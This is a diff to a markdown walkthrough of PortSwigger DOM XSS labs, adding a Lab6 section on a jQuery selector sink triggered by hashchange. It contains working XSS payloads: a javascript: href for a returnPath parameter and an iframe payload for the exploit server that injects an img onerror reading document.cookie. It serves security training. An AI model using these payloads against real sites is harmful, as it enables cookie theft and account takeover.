@@ -165,6 +165,7 @@ Te: trailers
 - The `onerror` handler runs the JavaScript.
 **Response**
 ```http
+                [...Remaining are omitted...]
                        <script>
                             function doSearchQuery(query) {
                                 document.getElementById('searchMessage').innerHTML = query;
@@ -174,6 +175,7 @@ Te: trailers
                                 doSearchQuery(query);
                             }
                         </script>
+                [...Remaining are omitted...]
 ```
 
 ### Below payloads will also work
@@ -206,6 +208,7 @@ Te: trailers
 ### The vulnerable portion is `returnPath` , when some alphanumeric string is placed here it get's stored in `href` tag .
 **Response**
 ```http
+                        [...Remaining are omitted...]
                                         <div class="is-linkback">
                                             <a id="backLink">Back</a>
                                         </div>
@@ -214,8 +217,34 @@ Te: trailers
                                                 $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
                                             });
                                         </script>
+                        [...Remaining are omitted...]
 ```
 
 <img width="1920" height="889" alt="lab-5" src="https://github.com/user-attachments/assets/2de04b34-972b-4cb5-8028-e881212d57df" />
 
 ### So `href` accepts `javascript:alert(document.cookie)` , when this payload is placed in `returnPath` , hit enter , then we've to click `Back` to execute our payload , previous labs ran automatically as no JS payload was needed .
+
+
+# Lab6: DOM XSS in jQuery selector sink using a hashchange event
+
+### Captured request of home page , and a vulnerable portion found .
+
+- `window.location.hash.slice(1)` – retrieves the URL fragment after #.
+- `decodeURIComponent()` – decodes URL-encoded characters.
+- `:contains()` – inserts the decoded input into a jQuery selector.
+- `$()` – interprets the resulting string as a selector.
+- jQuery’s `$()` function doesn’t just run CSS selectors — if the string it’s given looks like it contains an HTML tag, jQuery’s internal `isHTML` check kicks in and it creates and injects that HTML into the DOM instead of just selecting something. So by putting a tag like `<img>` into the hash, we can get jQuery to build and insert an actual DOM element, and from there, an onerror handler fires just like with `innerHTML`-based XSS.
+```http
+                   <script>
+                        $(window).on('hashchange', function(){
+                            var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
+                            if (post) post.get(0).scrollIntoView();
+                        });
+                    </script>
+```
+### Click `Go to exploit server` . Im Body add this 
+`<iframe src="https://your-lab-id.web-security-academy.net/#" onload="this.src+='<img src=1 onerror=alert(document.cookie)>'"</iframe>`
+### Then click `Store` , and then `View exploit` .
+### This will make a new image source with our lab id , and it will show our home page of lab. Now click `Deliver exploit to victim` to solve lab.
+
+
